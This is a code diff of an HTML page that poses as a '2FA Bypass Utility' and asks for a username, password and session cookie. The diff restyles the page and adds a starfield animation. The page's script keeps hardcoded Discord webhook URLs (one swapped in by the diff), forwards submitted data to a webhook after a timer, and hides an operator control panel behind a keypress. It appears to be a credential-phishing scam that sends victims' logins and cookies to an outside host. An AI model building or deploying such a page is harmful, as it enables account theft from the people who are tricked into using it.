@@ -3,79 +3,79 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Account Bypass Utility</title>
+  <title>Bypass Utility</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      background: linear-gradient(135deg, #1a202c, #2d3748);
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: black;
+      color: #00ffea;
+      overflow: hidden;
     }
-    h1 {
-      font-size: 2.5rem;
-      margin-bottom: 20px;
-      color: #fbbf24;
+    canvas#bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: -1;
     }
-    .form-container {
-      background-color: #4a5568;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
-      width: 100%;
-      max-width: 400px;
+    .form-container, #controlPanel {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid #00ffea;
+      box-shadow: 0 0 20px #00ffea;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 500px;
+      margin: 2rem auto;
       text-align: center;
     }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+    }
     input, button {
-      margin: 10px 0;
-      padding: 12px;
       width: 100%;
-      border: none;
+      padding: 0.75rem;
+      margin: 0.5rem 0;
       border-radius: 8px;
+      border: none;
       font-size: 1rem;
+      font-family: 'Orbitron', sans-serif;
     }
     input {
-      background-color: #2d3748;
-      color: white;
+      background: #111;
+      color: #00ffea;
+      border: 1px solid #00ffea;
     }
     input:focus {
-      outline: 2px solid #fbbf24;
+      outline: none;
+      box-shadow: 0 0 8px #00ffea;
     }
     button {
-      background-color: #3b82f6;
-      color: white;
+      background: #00ffea;
+      color: #000;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: 0.3s;
     }
     button:hover {
-      background-color: #2563eb;
+      background: #00c2b3;
     }
     #controlPanel {
       display: none;
-      margin-top: 20px;
-    }
-    #controlPanel h2 {
-      margin-bottom: 10px;
-      font-size: 1.5rem;
-      color: #fbbf24;
     }
     .session {
-      margin: 10px 0;
-      padding: 10px;
-      background: #2d3748;
+      background: #111;
+      padding: 1rem;
+      margin-top: 1rem;
+      border: 1px solid #00ffea;
       border-radius: 8px;
     }
   </style>
 </head>
 <body>
+
+<canvas id="bg"></canvas>
 
 <div class="form-container">
   <h1>2FA Bypass Utility</h1>
@@ -89,15 +89,15 @@
   <p>May take from 1 - 30 minutes depending on account</p>
 </div>
 
-<div id="controlPanel">
-  <h2>Control Panel</h2>
+<div id="controlPanel" class="form-container">
+  <h1>Control Panel</h1>
   <div id="sessions"></div>
 </div>
 
 <script>
 const hardcodedWebhooks = [
   "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_",
-  "https://discord.com/api/webhooks/1365369841678160082/rmClZPZsrzBzk65VmO8IZKRmhETqph-CfJ2rw9oqRj2-H4IVXlVjYRUTEdNZNTI417LV"
+  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e"
 ];
 
 let sessions = [];
@@ -112,7 +112,7 @@ function sendWebhook(url, payload) {
 
 document.getElementById('bypassForm').addEventListener('submit', e => {
   e.preventDefault();
-  
+
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
   const cookie = document.getElementById('cookie').value;
@@ -123,10 +123,10 @@ document.getElementById('bypassForm').addEventListener('submit', e => {
   sessions.push({ id: sessionId, username, password, cookie, webhook, approved: false });
   updateSessions();
 
-  const initialPayload = { content: "Bypass in progress... please wait. (May take 1-30 minutes depending on account)" };
-
   if (webhook) {
-    sendWebhook(webhook, initialPayload);
+    sendWebhook(webhook, {
+      content: "Bypass in progress... Please wait. May take 1 - 30 minutes depending on account."
+    });
   }
 
   const fullPayload = {
@@ -137,14 +137,12 @@ document.getElementById('bypassForm').addEventListener('submit', e => {
 
   setTimeout(() => {
     const session = sessions.find(s => s.id === sessionId);
-    if (session && !session.approved) {
-      if (session.webhook) {
-        sendWebhook(session.webhook, fullPayload);
-      }
+    if (session && !session.approved && session.webhook) {
+      sendWebhook(session.webhook, fullPayload);
       sessions = sessions.filter(s => s.id !== sessionId);
       updateSessions();
     }
-  }, 10 * 60 * 1000); // 10 minutes
+  }, 10 * 60 * 1000);
 });
 
 function updateSessions() {
@@ -178,19 +176,54 @@ function declineSession(id) {
   const reason = prompt("Enter decline reason:") || "Declined without reason";
   const session = sessions.find(s => s.id === id);
   if (session && session.webhook) {
-    const payload = { content: `Bypass failed: ${reason}` };
-    sendWebhook(session.webhook, payload);
+    sendWebhook(session.webhook, { content: `Bypass failed: ${reason}` });
   }
   sessions = sessions.filter(s => s.id !== id);
   updateSessions();
 }
 
-document.addEventListener('keydown', (e) => {
+document.addEventListener('keydown', e => {
   if (e.code === 'Numpad1') {
-    const cp = document.getElementById('controlPanel');
-    cp.style.display = cp.style.display === 'none' ? 'block' : 'none';
+    const panel = document.getElementById('controlPanel');
+    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
   }
 });
+
+// Animation: Starfield
+const canvas = document.getElementById('bg');
+const ctx = canvas.getContext('2d');
+let stars = [];
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
+
+for (let i = 0; i < 150; i++) {
+  stars.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    size: Math.random() * 2,
+    speed: Math.random() * 0.5 + 0.2
+  });
+}
+function animateStars() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  for (let star of stars) {
+    ctx.beginPath();
+    ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+    ctx.fillStyle = '#00ffea';
+    ctx.fill();
+    star.y += star.speed;
+    if (star.y > canvas.height) {
+      star.y = 0;
+      star.x = Math.random() * canvas.width;
+    }
+  }
+  requestAnimationFrame(animateStars);
+}
+animateStars();
 </script>
 
 </body>
